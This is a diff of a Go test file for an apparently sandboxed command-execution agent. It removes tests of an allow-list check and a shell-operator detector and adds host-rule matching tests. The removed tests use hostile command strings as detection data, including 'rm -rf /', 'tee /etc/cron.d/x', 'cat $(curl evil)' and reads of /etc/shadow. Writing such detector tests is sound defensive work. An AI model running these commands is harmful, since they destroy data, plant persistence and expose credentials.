@@ -167,96 +167,6 @@ func TestMaxOutputSize(t *testing.T) {
 }
 
 // ---------------------------------------------------------------------------
-// isApprovedLocally
-// ---------------------------------------------------------------------------
-
-func TestIsApprovedLocally(t *testing.T) {
-	t.Run("exact match", func(t *testing.T) {
-		if !isApprovedLocally("docker ps", []string{"docker ps"}) {
-			t.Error("exact match should be approved")
-		}
-	})
-
-	t.Run("prefix match with space boundary", func(t *testing.T) {
-		if !isApprovedLocally("docker ps -a --format json", []string{"docker ps"}) {
-			t.Error("prefix match with trailing args should be approved")
-		}
-	})
-
-	t.Run("not approved when not in list", func(t *testing.T) {
-		if isApprovedLocally("rm -rf /tmp", []string{"docker ps", "ls"}) {
-			t.Error("unlisted command should not be approved")
-		}
-	})
-
-	t.Run("empty approved list returns false", func(t *testing.T) {
-		if isApprovedLocally("ls", nil) {
-			t.Error("empty approved list should not approve anything")
-		}
-	})
-
-	t.Run("no partial word match - docker-compose is not docker", func(t *testing.T) {
-		if isApprovedLocally("docker-compose up", []string{"docker ps"}) {
-			t.Error("partial word should not match")
-		}
-	})
-
-	t.Run("no partial word prefix - docker ps-malicious is not docker ps", func(t *testing.T) {
-		if isApprovedLocally("docker ps-malicious", []string{"docker ps"}) {
-			t.Error("suffix without space boundary should not match")
-		}
-	})
-
-	t.Run("whitespace trimmed on both sides", func(t *testing.T) {
-		if !isApprovedLocally("  docker ps  ", []string{"  docker ps  "}) {
-			t.Error("whitespace trimming should make this match")
-		}
-	})
-
-	t.Run("multiple allowed entries - first match wins", func(t *testing.T) {
-		if !isApprovedLocally("git status", []string{"docker ps", "git status", "df -h"}) {
-			t.Error("should match second entry in approved list")
-		}
-	})
-}
-
-// ---------------------------------------------------------------------------
-// hasShellOperators - the approved-write sandbox bypass must never fire for a
-// command that can chain/redirect (closes the "approved | tee /etc/x" bypass).
-// ---------------------------------------------------------------------------
-
-func TestHasShellOperators(t *testing.T) {
-	withOps := []string{
-		"docker restart nginx | tee /etc/cron.d/x",
-		"docker restart nginx && rm -rf /",
-		"docker restart nginx; rm -rf /",
-		"cat $(curl evil)",
-		"echo `id`",
-		"echo x > /etc/passwd",
-		"read < /etc/shadow",
-		"(cd /tmp && rm x)",
-		"start &",
-		"a\nb",
-	}
-	for _, c := range withOps {
-		if !hasShellOperators(c) {
-			t.Errorf("expected shell operators detected in %q", c)
-		}
-	}
-	clean := []string{
-		"docker restart nginx",
-		"systemctl restart nginx",
-		"df -h",
-		"ls -la /var/log",
-	}
-	for _, c := range clean {
-		if hasShellOperators(c) {
-			t.Errorf("did not expect shell operators in %q", c)
-		}
-	}
-}
-
-// ---------------------------------------------------------------------------
 // structured exec: host rule matching + execution
 // ---------------------------------------------------------------------------
 
@@ -278,6 +188,37 @@ func TestHostRuleMatches(t *testing.T) {
 		if got := hostRuleMatches(c.argv, r); got != c.want {
 			t.Errorf("hostRuleMatches(%v) = %v, want %v", c.argv, got, c.want)
 		}
+	}
+}
+
+func TestHostRuleMatchesTrailingVariadic(t *testing.T) {
+	r := HostRule{Bin: "helm", Args: []string{"list", "..."}}
+	cases := []struct {
+		argv []string
+		want bool
+	}{
+		{[]string{"helm", "list"}, true},                          // zero trailing
+		{[]string{"helm", "list", "prod"}, true},                  // one
+		{[]string{"helm", "list", "-n", "prod", "--all"}, true},   // many
+		{[]string{"helm", "status", "prod"}, false},               // prefix literal differs
+		{[]string{"helm"}, false},                                 // missing "list" prefix
+		{[]string{"flux", "list"}, false},                         // bin differs
+	}
+	for _, c := range cases {
+		if got := hostRuleMatches(c.argv, r); got != c.want {
+			t.Errorf("hostRuleMatches(%v) = %v, want %v", c.argv, got, c.want)
+		}
+	}
+	// "*" before "..." still pins that one slot.
+	r2 := HostRule{Bin: "kubectl", Args: []string{"logs", "*", "..."}}
+	if !hostRuleMatches([]string{"kubectl", "logs", "pod-1"}, r2) {
+		t.Error("slot filled, no trailing: want match")
+	}
+	if !hostRuleMatches([]string{"kubectl", "logs", "pod-1", "-f"}, r2) {
+		t.Error("slot + trailing: want match")
+	}
+	if hostRuleMatches([]string{"kubectl", "logs"}, r2) {
+		t.Error("slot unfilled: want no match")
 	}
 }
 
@@ -321,21 +262,6 @@ func TestExecuteStructured(t *testing.T) {
 	})
 }
 
-func TestApprovedWriteBypassRequiresNoShellOperators(t *testing.T) {
-	// The exact decision executeCommand makes: an approved command with a pipe must NOT
-	// qualify for the bypass, so it stays sandboxed and Landlock blocks the appended write.
-	approved := []string{"docker restart nginx"}
-	piped := "docker restart nginx | tee /etc/cron.d/x"
-	bypass := !hasShellOperators(piped) && isApprovedLocally(piped, approved)
-	if bypass {
-		t.Error("a piped command must not qualify for the approved-write sandbox bypass")
-	}
-	clean := "docker restart nginx"
-	if !(!hasShellOperators(clean) && isApprovedLocally(clean, approved)) {
-		t.Error("a clean approved command should still qualify for the bypass")
-	}
-}
-
 // ---------------------------------------------------------------------------
 // executeCommand
 // ---------------------------------------------------------------------------
@@ -344,7 +270,7 @@ func TestExecuteCommand(t *testing.T) {
 	t.Run("successful command", func(t *testing.T) {
 		os.Unsetenv("REACH_COMMAND_TIMEOUT_SECONDS")
 		os.Unsetenv("REACH_MAX_OUTPUT_BYTES")
-		res := executeCommand("echo hello", "wild", false, nil)
+		res := executeCommand("echo hello", "wild", false)
 		if res.ExitCode != 0 {
 			t.Errorf("exit code %d, want 0", res.ExitCode)
 		}
@@ -357,14 +283,14 @@ func TestExecuteCommand(t *testing.T) {
 	})
 
 	t.Run("failed command returns non-zero exit", func(t *testing.T) {
-		res := executeCommand("exit 42", "wild", false, nil)
+		res := executeCommand("exit 42", "wild", false)
 		if res.ExitCode != 42 {
 			t.Errorf("exit code %d, want 42", res.ExitCode)
 		}
 	})
 
 	t.Run("stderr captured separately", func(t *testing.T) {
-		res := executeCommand("echo errline >&2", "wild", false, nil)
+		res := executeCommand("echo errline >&2", "wild", false)
 		if !strings.Contains(res.Stderr, "errline") {
 			t.Errorf("stderr %q does not contain 'errline'", res.Stderr)
 		}
@@ -376,7 +302,7 @@ func TestExecuteCommand(t *testing.T) {
 	t.Run("output truncated when over limit", func(t *testing.T) {
 		t.Setenv("REACH_MAX_OUTPUT_BYTES", "50")
 		// printf '%200s' prints 200 spaces; tr replaces with x → 200 bytes of 'x'
-		res := executeCommand("printf '%200s' | tr ' ' x", "wild", false, nil)
+		res := executeCommand("printf '%200s' | tr ' ' x", "wild", false)
 		if !strings.Contains(res.Stdout, "[TRUNCATED]") {
 			t.Errorf("expected truncated output, got %q", res.Stdout)
 		}
@@ -384,7 +310,7 @@ func TestExecuteCommand(t *testing.T) {
 
 	t.Run("command timeout returns non-zero exit", func(t *testing.T) {
 		t.Setenv("REACH_COMMAND_TIMEOUT_SECONDS", "1")
-		res := executeCommand("sleep 10", "wild", false, nil)
+		res := executeCommand("sleep 10", "wild", false)
 		// 124 on Linux (killed via context deadline), -1 on macOS (SIGKILL via ExitError)
 		if res.ExitCode == 0 {
 			t.Error("expected non-zero exit code for timed-out command")
@@ -401,7 +327,7 @@ func TestExecuteCommand(t *testing.T) {
 		if err := os.WriteFile(secret, []byte("x"), 0000); err != nil {
 			t.Skipf("cannot create unreadable file: %v", err)
 		}
-		res := executeCommand("cat "+secret, "approved", false /* isWrite=false */, nil)
+		res := executeCommand("cat "+secret, "approved", false /* isWrite=false */)
 		if res.Blocked {
 			t.Error("read permission denied should not set Blocked=true")
 		}
